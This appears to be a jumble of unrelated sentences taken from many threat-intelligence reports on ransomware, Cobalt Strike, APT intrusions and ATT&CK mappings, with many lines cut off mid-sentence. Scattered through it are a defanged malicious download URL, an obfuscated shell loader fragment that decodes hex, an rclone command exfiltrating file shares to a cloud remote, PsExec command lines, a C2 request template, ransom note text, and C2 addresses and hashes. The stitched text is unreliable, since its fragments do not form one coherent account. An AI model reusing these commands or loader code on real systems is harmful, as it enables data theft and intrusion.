hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd & timeout To evade detection, the actor utilized Living Off the Land Binaries (LOLBins).
For detailed analysis on the NetWalker ransomware attack, see McAfee ATR’s blog but, for simplicity, we matched the attack stages to the MITRE ATT&CK Framework below. 
Once a process is infected, the ProcessWorm spreads to its children. 
Available: https://github.com/moonD4rk/HackBrowserData (accessed: Apr. 28, 2023). 
nltest /domain_trustscmd.exe
-s cbdhsvc 8088 wab.exe C:\Users\USER\AppData\Local\wab.exe 34296 
After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers. 
In wave 2, the raw disk driver was embedded inside the malware and the wiping routine started immediately after driver installation, as opposed to the wave 1 procedure.
The file Электронный читатель резюме.exe ("Electronic reader resume.exe") is an executable self-contained loader for PL shellcode.
Bazarloader delivers all sorts of threats, from spam to ransomware like Conti or Ryuk. 
The method to be executed in the DLL is always named StartGame or StartUpdate.
T1560.002Archive Collected Data: Archive via LibraryFlowCloud and LookBack use a statically linked zlib library to compress data. 
The network traffic shows the target host communicating over SMB with the other compromised host running the parent HTTP Beacon.
Ensure least privilege principles are applied to user accounts and groups. 
If a match was found, the configuration of the Cobalt Strike team server was analysed.
The increasing use of open-source offensive security frameworks is a double-edged sword. 
Agent Tesla packers We have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples.
Minimize the amount and sensitivity of data available to external parties, for example: Scrub user email addresses and contact lists from public websites, which can be used for social engineering, Share only necessary data and information with third parties, and Monitor and limit third-party access to the network. 
At some point the application executes a jump instruction that redirects execution to the obfuscated trampoline in the .text section.
Before the execution of this export function, the shellcode reconstructs the imports table of the DLL and calls the DllEntryPoint, which simply invokes the Windows API function DisableThreadLibraryCalls as a way to increase the stealthiness of the DLL. SignalChromeElf essentially will decrypt, load, and execute an encrypted payload located in the embedded DLL.
We will cover the following: Macro-Laden Microsoft Office files Supply Chain Attack Living off the Land (LotL) Executables (EXE) files Macro-Laden Microsoft Office Files An example of a Cobalt Strike payload being delivered to victims via Microsoft Excel spreadsheets demonstrates that this tool is also used in mass phishing campaigns, not just targeted APT attacks.
Previously, this APT group has been observed targeting government officials, particularly in Southeast Asian countries.
This file is an obfuscated .NET file using process hollowing, which is a code injection technique in which an attacker removes legitimate code from an executable and replaces it with malicious code. 
The threat actor generally embeds the next stages of the execution inside an additional file, usually an XML or a PDF file.
Once the registers are populated by one or more Argument Loaders, an Invoker vfgadget can be called to simply execute the function pointer of the target API. 
Tradecraft Mistakes While UNC215 prioritizes evading detection within a compromised network, Mandiant identified several examples of code, C2 infrastructure, and certificate reuse indicating that UNC215 operators are less concerned about defenders’ ability to track and detect UNC215 activity. 
PS Exec CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Command and Scripting Interpreter (T1059.003) Windows Command Shell CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Native API (T1106) Use Windows API functions to inject DLL CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Windows Management Instrumentation ((T1047) 
Invoker vfgadger Starting from the second to the fourth line, the this pointer, referenced by RCX, is first stored on the stack and then moved into RAX.
T1098.
Protect endpoints against malware by:Ensuring antivirus signatures are up-to-date.
They returned the next day, at the same time as the previous day, and picked up where they left off.
As illustrated in Figure 2, the operators were able to access their primary target via RDP connections from a trusted third party using stolen credentials and used this access to deploy and remotely execute FOCUSFJORD on their primary target. 
%s shark+ " fullword wide $s10 = " Approximate- Choked- %s %s, " fullword wide $s11 = "niece beacon dwelling-
Because use of Mimikatz was likely blocked by endpoint security software, the attackers were forced to run bruteforcing offline.
Loader like matryoshka dolls with a side of REvil 
See figure 2 for a timeline of the team’s post exploitation activity that includes key points of access. 
Files in the new arrival vector After analyzing the downloaded archive, we discovered it to be a malicious RAR file with the TONEINS malware libcef.dll and the TONESHELL malware ~List of terrorist personnel at the border.docx.
Part of the activity of this team was described by Fortinet, who attributed the activity to APT10. ESET researchers, however, believe this activity is different from the operations that APT10 (aka A41APT) has conducted recently. 
In this case, the JPEG decoy file appears to be a correspondence related to the “Proof of Digital Assets”.
"$CS_FONT" ]; then # Load fonts by id CS_FONT_RID="<hexadecimal-encoded working directory path>" CS_FONT_ID="<hexadecimal-encoded Trojan Loader filename>" CS_FONT_COL="6364" CS_FONT_COLF=`echo ${CS_FONT_COL} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print "16i "$0}'|dc 2>/dev/null|awk '{printf("%c",$0)}'` CS_FONT_SID=`echo ${CS_FONT_RID} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print "16i "$0}'|dc 2>/dev/null|awk '{printf("%c",$0)}'` CS_FONT_LOAD=`echo ${CS_FONT_ID} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print "16i "$0}'|dc 2>/dev/null|awk '{printf("%c",$0)}'` if [ ! -n
Creates the C:\fn.txt or C:\etc\fn.txt ransom note when complete Dwell time of 7 days before executing ransomware On endpoints protected with Sophos the following detections triggered: CryptoGuard detected ransomware in C:\ProgramData\dllhost32.exe 'Cleanup_1a (T1486)' malicious behavior detected in 'C:\ProgramData\dllhost32.exe' Incident #2 Ransomware binary C:\ProgramData\hpupdate.exe is executed and detected as Troj/Ransom-GWG by Sophos [T11486 – Data Encrypted for Impact]
Public-Facing Application (T1190)Native API (T1106)File Deletion (T1070.004)OS Credential Dumping (T1003)Software Discovery: Security Software Discovery (T1518.001)Lateral Tool Transfer (T1570)Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)Data Encrypted for impact (T1486)Impair Defenses: Disable or Modify Tools (T1562:001)Remote System Discovery (T1018)Inhibit system Recovery (T1490)System Information Discovery (T1082)File and Directory Discovery (T1083) Indicators of Compromise (IOCs) SHA256 8be1c54a1a4d07c84b7454e789a26f04a30ca09933b41475423167e232abea2bb8066b7ec376bc5928d78693d236dbf47414571df05f818a43fb5f52136e8f2e3080b45bab3f804a297ec6d8f407ae762782fa092164f8ed4e106b1ee7e249537de8ca88e240fb905fc2e8fd5db6c5af82d8e21556f0ae36d055f623128c3377b227fa0485e34511627a8a4a7d3f1abb6231517be62d022916273b7a51b80a173bac058dbea51f52ce154fed0325fd835f35c1cd521462ce048b41c9b099e1e5353ee5805bc5c7a98fb5d522b15743055484dc47144535628d102a4098532cd55ab834f599c6ad35fcd0a168d93c52c399c6de7d1c20f33e25cb1fdb25aec9c652e25bdd600695cfed0d4ee3aca4f121bfebf0de889593e6ba06282845cf39ea35a0bced28fd345f3ebfb37b6f9a20cc3ab36ab168e079498f3adb25b41e156f7a73032ece59af3316c4a64490344ee111e4cb06aaf00b4a96c10adfdd65559908c7dfde13ade4b13350ae290616d7c2f4a87cbeac9a3886e90a175ee40fb641D4492a9eb36f87a9b3156b59052ebaf10e264d5d1ce4c015a6b0d205614e58e3B8066b7ec376bc5928d78693d236dbf47414571df05f818a43fb5f52136e8f2efcc2921020690a58c60eba35df885e575669e9803212f7791d7e1956f9bf8020 References https://www.zdnet.com/article/nemty-ransomware-operation-shuts-down/https://www.bleepingcomputer.com/news/security/new-nefilim-ransomware-threatens-to-release-victims-data/https://www.bleepingcomputer.com/news/security/nemty-ransomware-punishes-victims-by-posting-their-stolen-data/https://www.trendmicro.com/vinfo/au/security/news/cybercrime-and-digital-threats/updated-analysis-on-nefilim-ransomware-s-behaviorhttps://www.bankinfosecurity.com/blogs/toll-group-data-leaked-following-second-ransomware-incident-p-2902https://www.tollgroup.com/toll-it-systems-updateshttps://www.picussecurity.com/resource/blog/how-to-beat-nefilim-ransomware-attacks 
When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
A FilterToConsumerBinding associates Consumers to Filters.
https://transfersh.com/WindowsUpdate Output: https://transfersh.com/XXXXXXXX/WindowsUpdate After one download the file will be deleted and link will returns a 404 error.
Symmetric Cryptography T1104 Multi-Stage Channels T1095 Non-Application Layer Protocol Exfiltration T1048 Exfiltration Over Alternative Protocol Authors Vickie Su Threats Analyst Nick Dai Sr. Threat Researcher Sunny Lu Threats Analyst 
Finally, fodhelper.exe or computerDefaults.exe will be executed to trigger the ms-settings protocol. 
Remote Mac Exploitation Via Custom URL Schemes url: https://www.anomali.com/blog/wtb-remote-mac-exploitation-via-custom-url-schemes The intelligence in this week’s iteration discuss the following threats: Anonymous, Apache Struts vulnerability, BusyGasper, Cobalt Gang, DarkComet, DDoS, Loki Bot, Spear phishing, and WINDSHIFT APT.
Figure 8: OneNote attachment containing the “open” button that hides the HTA file. 
There were also instances of the malware actors using PsEXEC to enable the remote desktop protocol (RDP) of a target system before executing the ransomware. 
Initial Access – Lure document Back in 2020, through the command and control (C&C) domain observed in our investigation, we found a lure document with a malicious macro.
This one is loaded and executed in the same address space. 
Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.
This malware was thoroughly covered by our colleagues at Trend Micro and ESET, so we will refer the reader to their excellent write-ups to understand its internals better. 
BF20!tr LNK/Agent.
ExConti and FIN7 Actors Collaborate with New Domino Backdoor
MITRE ATT&CK Framework Tactic Technique Description Execution Command and Scripting Interpreter:
How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed. 
Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. 
Figure 18 shows a summary of the X4 components. 
Ensure that such technology only allows authorized, digitally signed scripts to run on a system. 
It then opens for the user (the second window in the screenshot on Figure 26, next to HTML Help). 
The binary downloaders are written by echoing the bytes and piping the content to a file in the victim system.
Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers.
A function that exfiltrates email addresses.
The information we needed was stored centrally and had not been tampered with: all we needed was some trial-and-error to choose the right values. 
File DeletionThe attackers have used malware that deletes itself from the system. 
Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834deee241b) in greater detail. 
Spearphishing Link T1566.002 Execution Windows Management Instrumentation T1047 Command and Scripting Interpreter:
Finally, the same master secret key is calculated on each side by utilizing the pre-master secret and the client and server random values. 
destination.ip destination.port tls.client.ja3 tls.server.ja3s zeek.ssl.server.name Count 5.196.103.145 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc choifejuce[.]lol 373 5.196.103.145 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc erinindiaka[.]quest 1 46.101.19.119 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc opiransiuera[.]com 278 178.128.85.30 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc zoomersoidfor[.]com 4 5.252.177.10 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc considerf[.]info 1 66.63.188.70 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc antiflamez[.]bar 1 155.138.159.45 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc www[.]onlinecloud[.]cloud 1 IcedID C2 beaconing over the intrusion: Cobalt Strike There were a number of beacons deployed across the environment, over 70 pipes were created.
Regarding njRAT, this group mostly uses v0.7.3 (also known as the Lime version).
More information on this service and others can be found here. 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.
The same Russian blogger previously published interviews with a representative of the group behind the REvil ransomware-as-a-service (RaaS), hackers and security experts. 
to Talos, the botnet has specifically targeted Spanish-speaking users in the Americas, and could be based in Brazil.
A TOR private key is needed to access the website. 
The following chart summarizes the controls expected to have the most effect against impact stage techniques and the McAfee solutions to implement those controls where possible. 
[USERNAME]@[IP ADDRESS] 1> \\127.0.0.1\admin$\__[STRING] 2>&1We also observed the adversary using Windows Batch files to execute PSExec.
When responding to an APT29 breach, it is vital to increase visibility, fully scope the incident before responding and thoroughly analyze accessed systems that don't contain known malware. 
It also creates a file full of garbage text that is not referenced again once created. 
From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC).
If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. 
Cloudflare users have the option to use their own subdomain and create a DNS record that points to Cloudflare.
Detection methods The following associated detection methods are in use by Alien Labs.
-y 0 ~~~~~~~~~~~~~~~Hardware~~~~~~~~~~~~~~~~~~ [19:32:07][4329948544][+] Add directory to encrypt: /Users/user/Downloads/lock_me_up 
Unfortunately, no software publisher is immune to being compromised and inadvertently distributing trojanized versions of their applications. 
Disruption or destruction to victim infrastructure to hinder analysis and consume defensive resource. 
Who is MuddyWater? Stuxnet was a big hit on Iran’s nuclear program in 2010.
Credentials from Password Stores: Password Managers T1555.005 
Fig 7 — Nemesis waits for data collection tasks to complete, then adds the data to a zip archive to be sent to the C2 Fig 8 — Nemesis uploads data to the C2 via a HTTP POST request The C2 address for the analysed sample is https[:]//es-megadom[.]com Fig 9 — Nemesis Configuration A Tangled Web Provides Opportunities This analysis highlights the intricate relationships between cybercriminal groups and their members.
Most of these were used to enable persistence of other, OS-based malware.
.
This program was discovered to be promoted on a cybercrime forum towards the end of May 2023.
This task will run the DLL hijacking target as SYSTEM at each boot. 
Verifying their interactive access. 
Most of the domains imitate Japanese venture capital companies, indicating that the group has an extensive interest in Japanese financial entities. 
Win64.COBALT.BE CobaltStrike 3434271f2038afaddad4caad8000e390b3573b2b53e02841653a4ee0dfd73674 Trojan.
Once again, if you’ve made it this far, thank you again for reading and we hope you enjoyed this peek into some of the more interesting work we’ve been doing as part of our never-ending endeavor to accurately detect every last malicious file the global internet has to offer us. 
Loader scripts such as those discovered in the fshec2 package contain a minimal amount of Python code and perform a simple action: loading of a compiled Python module.
For unknown reasons, the command to retrieve specific files from portable devices was removed. 
More recent campaigns from within the past three years still tend to follow this formula. 
This functionality communicates with 194.38.23[.]170. 
PowerShell script downloads the payloadsThe malicious PowerShell downloader script launches several processes that download the payloads and reboots the victim’s machine.
This document was exfiltrated and used to continue the intrusion via a company portal and VPN. 
Figure 1.
The explorer.exe and runtimebroker.exe parent processes are frequently abused for this goal, as they usually launch the real targets. 
POST <C&C address + port>/status.php?r=<epoch timestamp><random 16-bit int> HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: en-usUser-Agent: <return value of ObtainUserAgentString OR "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko">Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: <C&C url>Content-Length: <content length>
Table 3: Technical weakness identification techniques observed by CISA MITRE ID Name Observation T1288 Analyze Architecture and Configuration Posture CISA observed the cyber actors scanning a Federal Government agency for vulnerable web servers.
The following technical indicators are associated with the reported intelligence.
Technical Analysis Initial Infection Vectors [TA0001] Forensic investigations identified that the actor established initial access by compromising the victim’s web server [T1190].
When these ‘double email’ notes are appended to the head of files, it looks as follows: Alternate ransom note (double-email, no BTC) 
Spraying [T1110.003] Forced Authentication [T1187] Steal Application Access
When we want to visit Google, we simply type the domain name into our browser’s address bar, and the DNS service translates the user-entered domain name “google.com” into the corresponding IP address that a computer uses.
As part of their initial contact strategy, the group impersonated Chad O’Carroll, the founder of NK News and the associated holding company Korea Risk Group, using an attacker-created domain, nknews[.]pro, which closely resembles the legitimate NK News domain nknews.org.
The reference profile below is taken from Raphael Mudge’s GitHub repository. 
Once initialized, the Orchestrator launches its following components, which we will detail below: The application watcher that looks for specific processes and notifies the C2 server when they are started or stopped The ProcessWorm injector that injects the ProcessWorm into processes that are not infected with this component The recording manager thread that controls data to be exfiltrated to the C2 server The C2 server communicator thread. 
Application COM object and assigns it to the $exec variable.
It is also observed that the original filenames of the identified .docx samples were written in the Korean language. 
The krbtgt account is a domain default account that acts as a service account for the key distribution center (KDC) service used to encrypt and sign all Kerberos tickets for the domain.
By analyzing Trigona ransomware binaries and ransom notes obtained from VirusTotal, as well as information from Unit 42 incident response, we determined that Trigona was very active during December 2022, with at least 15 potential victims being compromised.
Mitigation: Change default usernames and passwords immediately after the installation and before deployment to a production environment [M1027]. Detection:
If the system is 64-bit and the 32-bit PowerShell exists in the correct path, execute a new 32-bit PowerShell process copying the current process command line as a new argument.
DMGs are a common delivery mechanism for both benign and malicious software.
Execution flow diagram Figure 1 depicts the icon of the malware and its overall execution.
[12/May/2023:21:18:00 +0000] "POST /wp-admin/theme-editor.php?wc-ajax=1&file=header.php HTTP/1.0" 200 45863 "https://<redacted>/wp-admin/theme-editor.php?wc-ajax=1&file=header.php" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" 139.162.234.6 - - [12/May/2023:21:18:02 +0000] "GET /wp-admin/theme-editor.php?theme=<redacted>&file=header.php&wp_scrape_key=9d62c27a9d88828dc1afaa4927b0550f&wp_scrape_nonce=395126822 HTTP/1.0" 200 46029 "-" "WordPress/6.2; https://<redacted>" .. 193.169.195.64 - -
CISA recently released an alert that highlighted the top 10 vulnerabilities routinely exploited by sophisticated foreign cyber threat actors from 2016 to 2019.[6] Additionally, table 2 provides a list of notable compromises by Chinese MSS-affiliated actors within the past 12 months. 
Figure 14 – Pass-the-Hash attack Further, as indicated below, any subsequent NTLM authentication from the logon session will use the stolen credentials to authenticate to domain joined systems like the Active Directory Controller. 
On first launch, shellcode will be taken from MyResume.pdf; on subsequent launches, winness.config is the shellcode source. 
The exploitation stage is where the attacker gains access to the target system.
The decoded PowerShell instructions are below:This PowerShell is responsible for the performing the following tasks:Disabling PowerShell logging.
Gk\nWhere the function ⟨⋅⟩, commonly referred to as the encoding function, converts a bit string into a scalar element (for our purpose, scalar can be interpreted as an integer less than the subgroup order).\n
As well as using cryptocurrency themselves to extract ransoms, cybercriminals are now also tailoring malware to exploit the booming market for NFTs and crypto games.
In some cases, the actor used a preconfigured (hard-coded) target lists, which is showing the intended victims.
CobaltStrike.
For the Standard IcedID Bot, this value is set to 119 as seen above, but for the Forked variant, we get the following base64 decoded header; 998075300:0:111:67:1 
In addition to the improvements in the ransomware, open slots for new affiliates are advertised.
Interested readers may refer to the documentation and source code on GitHub. 
InputStreamReader; public class HelloWorld { public static void main(String[] args) { // Ausgabe Hello World! 
Document Analysis The macro-enabled document is named “zatverdzhenniy_spisok_osib_na_otrim”, which roughly translates to “approved list of persons to receive” in Ukrainian.
Cleanup() – This function performs cleanup operations after encrypting files in the victim’s machine. 
Quasar Server Certificate. 
EclecticIQ analysts mapped identified TTPs to each phase of the life cycle (Figure 2) - beginning with the threat actor´s infrastructure (156[.]251[.]172[.]194) and continuing with the different tools used by the actor to compromise systems and perform lateral movement. 
This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session. 
Parameters | where Param.
A sample of the information included with this event is below: Figure 9.
Mimikatz – a credential theft tool. 
59.95.98.204 JA3:
Encryption process and calculation Its calculation of N bytes is as follows: X / 10* (Original file size) & 0xFFFFFFF0 where X is the value set before encryption X is either 0x32 (50) or 0x64 (100) 
CSC 4 Control Admin Privileges CSC 5 Secure Configuration CSC 6 Log Analysis Endpoint Security Platform 10.7, Threat Prevention, MVISION EDR Collection Data from network shared drive (T1039) 
Figure 55.
Executive Summary Following a recent Incident Response, McAfee Enterprise‘s Advanced Threat Research (ATR) team worked with its Professional Services IR team to support a case that initially started as a malware incident but ultimately turned out to be a long-term cyber-attack. 
A vulnerability in the “My Cloud” devices from the storage solutions company, "Western Digital," was discovered.
CatB Ransomware  File Locker Sharpens Its Claws to Steal Data with MSDTC Service DLL Hijacking
Implement Credential Guard for Windows 10 and Server 2016 (refer to Microsoft: Manage Windows Defender Credential Guard for more information).
Figure 15.
[serial number: 0x22E2CC6E device path: \VOLUME{01d89216e27acb2f-22e2cc6e}] Employing an existing IT tool, LANSweeper, to access detailed network and system information. 
Eventually, the threat actor attempted an account that they had the correct password for but that had not been set up with MFA.
The second stage payload, which was later determined to likely be the penetration testing framework "Brute Ratel," was then downloaded via a connection to an IP from Russia. 
Main function of variant in 2021 Loader in the latest campaign (2022, variant 3) Compared to previous variants, changes were seen in the code structure in variant 3.
To confirm that our software works email to us 2 files from random computers you will get them decrypted. 
If you do not pay the ransom, we will attack your company again in the future. 
Possible URIs that can be generated follow these formats: pki/crl/<random components>.crl, where <random components> can be numbers and one of the following strings: “-root” “-cert” “-universal_ca” “-ca” “-primary_ca” “-timestamp” “-global” “-secureca” fonts/
Conclusion Supply chain compromises are a growing concern for businesses, as they can lead to serious security breaches and financial losses.
In addition to the previous modifications, we now aim to keep track of every attempt to execute our stager after the initial compromise: whenever a 404 error is detected, indicating that the file is no longer available on the server, we’ll request a URL using canarytokens.org As said early this serves as a signal to log the event and provides valuable information for monitoring and analysis purposes. 
CatB malware will also attempt to locate and extract sensitive information from Windows Mail profile data (\AppData\Local\Microsoft\Windows Mail\). 
GoBruteforcer also seems to be in active development, so attackers could change the techniques they use to target web servers in the near future. 
The cookies were then added to a new session using a “Cookie Editor” Chrome extension that the threat actor installed on victim systems and removed after using. 
One of them is the name of the next file that is going to be loaded.
Protocol Impersonation Winnti uses FakeTLS in Crosswalk traffic T1573.001 Encrypted Channel:
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskThe MSI installers create scheduled tasks to achieve persistence. 
The threat actor then moved laterally to a workstation.
The UI of the decoy pages is very similar to the UI of the original pages. 
These two samples contain a hardcoded Monero (XMR) wallet address and an associated mining pool, as shown in Figure 3. Figure 3.
To hide this window, the tool explicitly adds new entries to HKCU\Software\Microsoft\Windows\CurrentVersion\ApplicationAssociationToasts to disable all toasts related to the protocol ms-windows-store. 
The backdoor we found on the server, and its versions found in the wild, are executables with names related to foreign affairs, such as PDF_ Contacts List Of Invitated Deplomatic Members and Note_Documents_No.14-Tokyo-__From___Embassy___of___Russia_.
Below is a high-level visualization of how the decoy network can look like the domain environment. 
These include the HelloKitty (aka FiveHands) and Zeppelin strains of ransomware as opposed to Vice Society developing their own custom payload. 
DNS [T1071.004] Proxy: External Proxy [T1090.002] Proxy: Multi-hop
EA298866E5A61FEEA4D062987F23B10A78C8A4CAN/AWin32/Agent.
This particular watermark has previously been attributed to a leaked Cobalt Strike version and is unsurprisingly used by other malicious actors, such as Maze ransomware and Trickbot groups, making attribution based on the watermark number impossible.
For instance, one of the ways UEBA solutions could prove useful is to baseline user behavior and monitor access to credential stores on the system.
Figure 3 (For a larger resolution of this diagram visit this link) Defense Evasion Component As described in Figure 3, the Redline Loader will also load an executable named it532878.exe, which is a .NET executable that is responsible for defense evasion.
Its root element may contain the following fields: Debug is the flag for enabling debug logging Group is an arbitrary string sent together with system information. 
Hence, given a message hash H(M), the message M’ crafted by flipping every third bit of M produces a hash output equal to the negation of H(M), which coincide in their x-coordinate.
rclone.exe, copy, \\REDACTED\Shares, mega:Shares, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 4, --transfers, 4 This activity was also visible on the network via Zeek logs showing the SMB share connection activity. 
Various phishing emails and their attached files Malicious artifacts Droppers The executable files contained in compressed archives that are downloaded via the phishing emails are responsible for decrypting and running remote access trojans on a victimized computer.
An additional decoy document titled 계약서내용.pdf (Contract detail.pdf) appears to be associated with a national South Korean broadcaster.
Immediately isolate affected systems. 
Azureedge.net is a parent domain owned by Microsoft, and part of Microsoft’s Azure content delivery network. 
The packers compress (and if it has the functionality of a crypter also encrypts) the original executable, which is saved in one of the sections of the final packed file.
Note the first packet from the experimental machine to the emulated C2 device following the 3-way TCP handshake shows header information containing the OpenSSH client information.
Indicator Removal: File Deletion Trigona operators delete files such as mim.exe, mim32.exe, zam.exe and zam.bat to cover their tracks.
Fortinet has multiple solutions designed to help train users to understand and detect phishing threats, including the FortiPhish Phishing Simulation Service, which uses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. 
Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run.
[T1059.004] Python
Detects the presence of debuggers through APIs IsDebuggerPresent, and OutputDebugStringW, and checks for system breakpoints.
Custom implementation of murmur hash The malware employs dynamic API resolving to conceal its API imports and make static analysis more difficult.
While investigating the Crypter, we saw how important it was for the threat actor to hide its malicious intentions inside legitimate applications in order to avoid detection.
[T1070.001], Masquerade Task or Service [T1036.004] Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Credential Access The below courses of action mitigate the following techniques: Credentials from Password Stores
ExecutionT1204.002User
The emails were personalized to the recipient by using the recipient’s name in the greeting of the email.
The Domino Backdoor is designed to contact a different C2 address for domain-joined systems, suggesting a more capable backdoor, such as Cobalt Strike, will be downloaded on higher value targets instead of Project Nemesis. 
We can see in the batch file in Figure 7, which Sandals creates on remote systems to launch Fantasy, that the same base64-encoded argument containing an XML of an RSAParameters object is passed to Fantasy at runtime.
Why is it difficult to detect Cobalt Strike? Cobalt Strike is difficult to detect because of its several defense techniques.
[WINDOWS-SYSMON]
Figure 37: Contents of the user.ps1 Another new addition to BatLoader is the antivirus check script (checkav.ps1).
Details are given in other stages. 
Client Details Form.doc Judging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts. 
[payload URL(| -x proxy URL)]
If you want to experience some of the MVISION Insights capabilities, go the Preview of MVISION Insights where you can select the top threat information that is available. 
T1132.001Data Encoding: Standard EncodingSimplexTea encodes C&C traffic using base64. 
0x00000000 0x000031e0 0x0001 payload type 0x0001 0x0002 8 windows-beacon_https-reverse_https 0x0002 port 
However, our telemetry data revealed far more attacks at 269 attempts on Trend Micro customers from March 2022 to April 2023. 
Backdoor.
T1016.001System Network Configuration Discovery: Internet Connection DiscoveryDolphin checks internet connectivity. 
The malware repository 85.214.149[.]236:443/sugarcrm/themes/default/images/ contains known TeamTNT malware that includes the same files as the known TeamTNT repository hxxp://dockerupdate.anondns[.]net:443/sugarcrm/themes/default/images/, which is linked to TeamTNT via the malware sample 1aaf7bc48ff75e870db4fe6ec0b3ed9d99876d7e2fb3d5c4613cca92bbb95e1b, as shown in Figure 11. 
O365 Delegated Administrator Abuse CrowdStrike also identified a connection between StellarParticle-related campaigns and the abuse of Microsoft Cloud Solution Partners’ O365 tenants.
These are probably compromised devices that act as proxies for their C&C servers.
%appdata%\Python27(32)\ %appdata%\Python27(64)\ 
Unlike the typical bitwise operations from typical decryption routines, ViperSoftX uses byte remapping to ensure that the shellcode cannot be easily decrypted without the correct byte map, weaving a cross-stitch template to the palette of 256 (0x100h) bytes.
It may be the first supply chain attack to take advantage of the fact that Python byte code (PYC) files can be directly executed, and it comes amid a spike in malicious submissions to the Python Package Index (PyPI).
To prevent this attack, we should:Enforce source IP verifications on all network devices.
Trend Micro solutions Trend Micro customers are protected from threats like ViperSoftX with Trend Micro Vision One™, which provides multilayered protection and behavior detection, thereby blocking questionable behavior and tools before a piece of malware can do any damage.
It collects sensitive data from web browsers, email clients, FTP servers and crypto wallets.
WpnUserService win_cobalt_strike_auto 10256 UOmCgbXygCe.exe “C:\Users\USER\AppData\Local\FrlxbduRbdVAbVbS\UOmCgbXygCe.exe” win_cobalt_strike_auto 836 svchost.exe C:\Windows\system32\svchost.exe -k DcomLaunch -p win_cobalt_strike_auto 1008 svchost.exe C:\Windows\system32\svchost.exe -k DcomLaunch -p
During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.
COOP obj ptr> <1st vfgadget> <WinAPI> <API argument> 
Active Scanning: Scanning IP Blocks The threat actor probed external services in an attempt to regain access to the environment Indicators of Compromise (IOCs) Indicator Details http://satkas.waw[.]pl/rainloop/forecast TrailBlazer C2 1326932d63485e299ba8e03bfcd23057f7897c3ae0d26ed1235c4fb108adb105 TrailBlazer SHA256 vm-srv-1.gel.ulaval.ca GoldMax C2 2a3b660e19b56dad92ba45dd164d300e9bd9c3b17736004878f45ee23a0177ac GoldMax SHA256 156.96.46.116 TA Infrastructure 188.34.185.85 TA Infrastructure 212.103.61.74 TA Infrastructure 192.154.224.126 TA Infrastructure 23.29.115.180 TA Infrastructure 104.237.218.74 TA Infrastructure 23.82.128.144 TA Infrastructure Additional Resources Read about the latest trends in threat hunting and more in the 2021 Threat Hunting Report or simply download the report now. Learn more about Falcon OverWatch proactive managed threat hunting. 
The malware takes the following steps to modify the MBR: Reads the MBR and encodes it using XOR encoding with key 0x7 The first sector is overwritten by a custom boot loader 
Figure 4.
The infection script here delivered 472548a4b8295182f6ba8641d74725c2250b7243 – the Tsunami sample. 
Fig.5 Decrypted payload The decrypted payload that is going to be executed contains another embedded DLL as shown below.
The sandbox analysis presenting this case is available here. 
Figure 4 – VBA macro which runs rundll32.exe to load the malware. 
Configuration of Cobalt Strike BeaconThe archive was distributed on approximately June 1, 2020, from the IP address 66.42.48[.]186 and was available at hxxp://66.42.48[.]186:65500/electronic_resume.pdf.rar.
The thread dispatches received commands to plugins and sends their execution results back to the server. 
These archives are hosted in legitimate file hosting services such as OneDrive or MediaFire.
Use an authentication, authorization, and accounting (AAA) systems to limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. 
The decompiled code can be seen in Figure 21.
